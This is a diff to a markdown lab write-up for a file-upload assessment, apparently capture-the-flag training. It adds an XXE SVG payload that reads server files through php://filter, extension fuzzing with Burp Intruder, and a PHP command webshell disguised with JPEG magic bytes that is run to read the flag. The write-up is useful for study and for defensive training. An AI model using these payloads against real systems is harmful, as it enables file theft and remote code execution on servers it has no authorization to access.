@@ -150,11 +150,11 @@ GIF8
 
 ## Identify File Upload  
 
->The web application contact form contain screenshot file upload function.  
+>Enumerating and discovery of the web application contact form contain screenshot file upload function.  
 
 ![upload-skills-assess-page](/images/upload-skills-assess-page.png)  
 
->Intercept with Burp Suite and start fuzzing...  
+>Intercept with Burp Suite and start fuzzing file uploads.  
 
 ### Client Side  
 
@@ -167,13 +167,22 @@ GIF8
 
 ![upload-skills assess Client Side](/images/upload-skills-assess-clientside.png)  
 
+### SVG XML Upload  
+
 >Enumerate if possible to upload SVG extension with XML content.  
 
 ![upload-skills-assess-xml-svg](/images/upload-skills-assess-xml-svg.png)  
 
 >Successfully read file `/etc/hostname` as POC.
 
->Get the source code for all the files to find web directories, blacklist and whitelist filters etc.  
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/contact/upload.php"> ]>
+<svg>&xxe;</svg>
+```  
+
+>Get the source code for all the PHP files to find web directories, blacklist and whitelist filters etc.  
+>Content of `upload.php`.  
 
 ```php
 <?php
@@ -223,19 +232,48 @@ if (move_uploaded_file($_FILES["uploadFile"]["tmp_name"], $target_file)) {
 }
 ```  
 
+>The above PHP source code reveal the renamed path and file name as example will be: `http://94.237.59.206:37111/contact/user_feedback_submissions/230723_test.png`  
 
+>The content of apache2.conf provide log file names but nothing else. 
 
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/apache2/apache2.conf"> ]>
+<svg>&xxe;</svg>
+```  
+
+### Extension Enumeration  
+
+>Run Burp Intruder to determine valid file extensions.  
+>[PHP Extension Wordlist](https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst)  
 
 ![upload-skills-assess-extension](/images/upload-skills-assess-extension.png)  
 
->Burp Suite Intruder identify possible valid extension as `.phar`.  
+>Payload position on the extension of the filename and the type of attack Sniper.  
+>Identified a valid extension as `.phar.jpeg`  
 
+### Webshell  
 
+>Create PHP webshell with mime-type to bypass filters. 
 
-GET /contact/submit.php?Name=test1&Email=test2%40test.com&Message=test3&uploadFile=file_uploads_normal_request.jpg
+>Create following file as `shell.phar.jpeg` in Linux Mousepad editor.  
+
+```
+AAAA
+<?php echo system($_GET["cmd"]);?>
 ```  
 
+>Change MIME type using `hexeditor` and enter the magic numbers by replacing the `AAAA` values.
+>Magic MIME Type bytes for JPEG = `FF D8 FF DB`  
+
+![upload-skills-assess-hexeditor](/images/upload-skills-assess-hexeditor.png)  
+
+>Upload the modified webshell file to target.  
+
+![upload-skills assess webshell](/images/upload-skills-assess-webshelll.png)  
+
+>Once the image webshell file upload browse to it at, `http://1.2.3.4/contact/user_feedback_submissions/230723_shell.phar.jpeg?cmd=cat+/flag.txt` to obtain the flag.  
+
+![upload-skills-assess-flag](/images/upload-skills-assess-flag.png)  
 
 
-
- 
